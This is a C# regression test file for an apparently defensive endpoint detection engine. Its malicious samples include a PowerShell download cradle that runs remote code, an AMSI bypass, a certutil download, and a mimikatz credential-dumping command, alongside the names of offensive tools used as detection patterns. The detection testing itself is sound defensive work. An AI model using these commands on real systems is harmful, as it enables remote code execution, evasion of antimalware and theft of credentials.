using System.Diagnostics;
using Behavedr.Core;
using Behavedr.Core.Models;
using Behavedr.Core.Monitors;
using Behavedr.Core.Platform;
using Behavedr.Core.Policy;

namespace Behavedr.Tests;

/// <summary>
/// Regression suite for false positives found in review: ordinary software and the agent's own
/// activity were flagged. Benign samples must stay silent, and real tradecraft must still fire.
/// </summary>
public class FalsePositiveRegressionTests
{
    private static bool IsTradecraft(Signal s) =>
        s.Type.StartsWith("download_cradle", StringComparison.Ordinal) ||
        s.Type.StartsWith("amsi_bypass", StringComparison.Ordinal) ||
        s.Type.StartsWith("lolbin", StringComparison.Ordinal) ||
        s.Type.StartsWith("encoded_powershell", StringComparison.Ordinal) ||
        s.Type.StartsWith("obfuscated_cmdline", StringComparison.Ordinal) ||
        s.Type.StartsWith("execution_policy_bypass", StringComparison.Ordinal);

    [Theory]
    [InlineData("git", "git log --grep=curl --oneline")]
    [InlineData("chrome", "chrome.exe --type=renderer https://example.com/curl-guide")]
    [InlineData("devenv", "devenv.exe /Edit Program.cs")]
    [InlineData("dotnet", "dotnet test Behavedr.sln -c Release")]
    [InlineData("code", "Code.exe --amsi-plugin C:\\tools\\amsi.dll")]
    [InlineData("powershell", "powershell.exe -NoProfile -Command Select-String -Path *.cs -Pattern 'DownloadString|amsiInitFailed'")]
    [InlineData("pwsh", "pwsh -c Get-Content rules.txt | Select-String 'Invoke-WebRequest'")]
    public void BenignCommandLine_ProducesNoTradecraftSignal(string name, string cmdLine)
    {
        var signals = CommandLineThreatRules.Evaluate(name, cmdLine, 4321);
        Assert.DoesNotContain(signals, IsTradecraft);
    }

    [Theory]
    [InlineData("powershell", "powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')", "download_cradle")]
    [InlineData("curl", "curl.exe -o C:\\Users\\Public\\a.exe https://203.0.113.5/a.exe", "download_cradle")]
    [InlineData("powershell", "powershell.exe -c [Ref].Assembly.GetType('X').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", "amsi_bypass_attempt")]
    [InlineData("certutil", "certutil.exe -urlcache -split -f http://203.0.113.5/p.bin p.bin", "lolbin")]
    public void MaliciousCommandLine_StillProducesSignal(string name, string cmdLine, string expectedPrefix)
    {
        var signals = CommandLineThreatRules.Evaluate(name, cmdLine, 4321);
        Assert.Contains(signals, s => s.Type.StartsWith(expectedPrefix, StringComparison.Ordinal));
    }

    [Fact]
    public void AgentOwnsItself_AndDirectChildren_ButNotUnrelatedPids()
    {
        Assert.True(AgentProcessIdentity.IsAgentOwned(Environment.ProcessId));
        Assert.True(AgentProcessIdentity.IsAgentOwned(987654, Environment.ProcessId));
        Assert.False(AgentProcessIdentity.IsAgentOwned(987654, 1));
    }

    [Fact]
    public void TrackedSpawnedProcess_IsOwnedOnlyWhileItRuns()
    {
        if (!OperatingSystem.IsWindows()) return;

        using var child = Process.Start(new ProcessStartInfo("cmd.exe", "/c ping -n 30 127.0.0.1")
        {
            UseShellExecute = false,
            CreateNoWindow = true,
        })!;
        int childId = child.Id;
        try
        {
            AgentProcessIdentity.TrackSpawned(childId);
            Assert.True(AgentProcessIdentity.IsAgentOwned(childId));
        }
        finally
        {
            child.Kill(entireProcessTree: true);
            child.WaitForExit();
        }

        Assert.False(AgentProcessIdentity.IsAgentOwned(childId));
    }

    [Fact]
    public void Corroboration_CountsOnlyRecentCategoriesOnTheSamePid()
    {
        var start = DateTime.UtcNow;
        var clock = start;
        var engine = new ScoringEngine(clock: () => clock);
        var evt = new DetectionEvent("77", "app.exe", "behavior", start, false, "test");
        var injection = new List<Signal> { new("injection:pid:77", 50, 0.5) };
        var ransom = new List<Signal> { new("ransom_io:pid:77", 50, 0.5) };

        engine.ScoreDetection(evt, injection);

        clock = start.AddMinutes(1);
        Assert.Equal(1, engine.ScoreDetection(evt, ransom).CorroboratingCategories);

        // Injection (from 19 minutes earlier) has expired, so nothing else adds to the score.
        clock = start.AddMinutes(20);
        engine.ScoreDetection(evt, injection);
        clock = start.AddMinutes(40);
        Assert.Equal(0, engine.ScoreDetection(evt, ransom).CorroboratingCategories);
    }

    [Fact]
    public void Suppression_NeverHidesPresidentsLawSignals_AndRequiresSignature()
    {
        var self = Environment.ProcessPath!;
        int pid = Environment.ProcessId;
        var rules = new[]
        {
            new SuppressionRule { ImagePath = self, SignalPrefix = "amsi_bypass_attempt", Reason = "test" },
            new SuppressionRule { ImagePath = self, SignalPrefix = "short_lived_powershell", Reason = "test" },
        };
        var signals = new List<Signal>
        {
            new($"amsi_bypass_attempt:pid:{pid}", 85, 0.9),
            new($"short_lived_powershell:pid:{pid}", 25, 0.5),
        };

        var signed = new SuppressionList(rules, _ => true);
        var kept = signed.Apply(signals, out int suppressed);
        Assert.Single(kept);
        Assert.StartsWith("amsi_bypass_attempt", kept[0].Type, StringComparison.Ordinal);
        Assert.Equal(1, suppressed);

        var unsigned = new SuppressionList(rules, _ => false);
        unsigned.Apply(signals, out int none);
        Assert.Equal(0, none);
    }

    [Theory]
    [InlineData("EmpireEarth", @"C:\Program Files (x86)\Empire Earth\EmpireEarth.exe")]
    [InlineData("cobalt", @"C:\Program Files\Cobalt Labs\cobalt.exe")]
    [InlineData("notepad", @"C:\Windows\System32\notepad.exe")]
    public void DescriptiveNames_AreNotFlagged(string name, string path)
    {
        Assert.Null(ThreatHeuristics.Evaluate(name, path));
    }

    [Theory]
    [InlineData("mimikatz_x64")]
    [InlineData("cobaltstrike")]
    [InlineData("frida-server")]
    public void OffensiveToolNames_StillProduceTelemetry(string name)
    {
        var score = ThreatHeuristics.Evaluate(name, null);
        Assert.NotNull(score);
        Assert.Equal("known_tool_name_only", score!.Value.Tag);
    }

    [Fact]
    public void CommandLineInsteadOfPath_StillMatchesToolByFirstToken()
    {
        // Linux monitors pass the command line when the executable path is unknown.
        var score = ThreatHeuristics.Evaluate(null, "mimikatz.exe sekurlsa::logonpasswords");
        Assert.NotNull(score);
        Assert.Equal("known_tool_name_only", score!.Value.Tag);
    }

    [Fact]
    public void ExecutableOnlyInDownloads_IsWeakContextNotAnAlert()
    {
        var score = ThreatHeuristics.Evaluate("setup", @"C:\Users\me\Downloads\setup.exe");
        Assert.NotNull(score);
        Assert.Equal("executable_from_downloads", score!.Value.Tag);
        Assert.True(score.Value.Weight * score.Value.Confidence < 40);
    }
}
